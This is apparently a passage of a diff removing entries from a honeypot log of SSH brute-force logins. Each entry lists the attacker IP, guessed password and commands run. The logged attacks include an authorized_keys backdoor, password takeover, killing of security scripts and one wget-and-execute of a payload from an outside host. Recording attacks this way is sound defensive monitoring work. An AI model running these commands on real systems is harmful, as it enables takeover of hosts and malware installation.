-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "117.102.83.237",
-        "username": "root",
-        "password": "Server2012",
-        "time": "15:12:40",
-        "commands": [
-          "uname -a",
-          "hostname",
-          "uname -m&&pkill upnpsetup",
-          "rm ./upnpsetup",
-          "wget -nc http://45.87.174.8/k.php?a=aarch64,U4945900210Q0C0VH -O ./upnpsetup",
-          "chmod 777 ./upnpsetup",
-          "sudo ./upnpsetup",
-          "./upnpsetup"
-        ]
-      },
-      {
-        "ip": "36.52.178.110",
-        "username": "esuser",
-        "password": "12345678",
-        "time": "15:48:03",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"12345678\\naJLWBAQxB4bf\\naJLWBAQxB4bf\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"12345678\\naJLWBAQxB4bf\\naJLWBAQxB4bf\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "107.173.159.136",
-        "username": "admin",
-        "password": "Qwerty123",
-        "time": "15:50:34",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"Qwerty123\\nwSXshpDPULGZ\\nwSXshpDPULGZ\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"Qwerty123\\nwSXshpDPULGZ\\nwSXshpDPULGZ\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "114.217.10.60",
-        "username": "root",
-        "password": "Abc123!@#$%",
-        "time": "15:57:01",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:eA3hk9KfuJJ4\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "107.173.159.136",
-        "username": "root",
-        "password": "Abc123!@#$%",
-        "time": "16:07:12",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:rbrF0r23cYBM\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "118.196.9.245",
-        "username": "root",
-        "password": "1qaz!QAZ",
-        "time": "16:16:39",
-        "commands": [
-          "uname -s -m"
-        ]
-      },
-      {
-        "ip": "83.233.149.204",
-        "username": "root",
-        "password": "asddsa",
-        "time": "16:35:15",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:qSuYGK5AQsnw\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "41.82.50.218",
-        "username": "root",
-        "password": "asddsa",
-        "time": "17:00:27",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:Vm1hL1fStMXl\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "198.98.56.205",
-        "username": "teste1",
-        "password": "123",
-        "time": "17:23:53",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"123\\nHxBky3Oj9L9w\\nHxBky3Oj9L9w\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"123\\nHxBky3Oj9L9w\\nHxBky3Oj9L9w\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "117.55.229.156",
-        "username": "teste1",
-        "password": "123",
-        "time": "17:40:15",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"123\\nxJUIE8vR7kDJ\\nxJUIE8vR7kDJ\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"123\\nxJUIE8vR7kDJ\\nxJUIE8vR7kDJ\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "211.75.225.118",
-        "username": "ubuntu",
-        "password": "qweasd123!@#",
-        "time": "17:44:19",
-        "commands": [
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"qweasd123!@#\\n2ok9BrO9DHTJ\\n2ok9BrO9DHTJ\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"qweasd123!@#\\n2ok9BrO9DHTJ\\n2ok9BrO9DHTJ\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l",
-          "w"
-        ]
-      },
-      {
-        "ip": "183.83.197.226",
-        "username": "root",
-        "password": "jailbreak1",
-        "time": "18:21:36",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:MBjGAkKycdi4\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "51.178.114.78",
-        "username": "root",
-        "password": "jailbreak1",
-        "time": "18:32:10",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:b391syvXguWA\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "139.59.4.137",
-        "username": "root",
-        "password": "jailbreak1",
-        "time": "18:48:00",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:d0Hb1Cc7vUqk\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "58.152.42.174",
-        "username": "root",
-        "password": "hola12",
-        "time": "18:57:16",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:PtjTkX33LqlI\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "14.103.104.36",
-        "username": "administrator",
-        "password": "password@123",
-        "time": "19:51:34",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"password@123\\nKwZif80SWetp\\nKwZif80SWetp\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"password@123\\nKwZif80SWetp\\nKwZif80SWetp\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "180.184.51.110",
-        "username": "root",
-        "password": "Song@123",
-        "time": "19:58:48",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:GteTW7TLCDdo\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "180.184.51.110",
-        "username": "administrator",
-        "password": "password@123",
-        "time": "20:00:46",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh"
-        ]
-      },
-      {
-        "ip": "217.154.35.203",
-        "username": "teste",
-        "password": "teste2026",
-        "time": "21:15:14",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"teste2026\\nG5GUASAKKSgV\\nG5GUASAKKSgV\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"teste2026\\nG5GUASAKKSgV\\nG5GUASAKKSgV\\n\"|passwd",
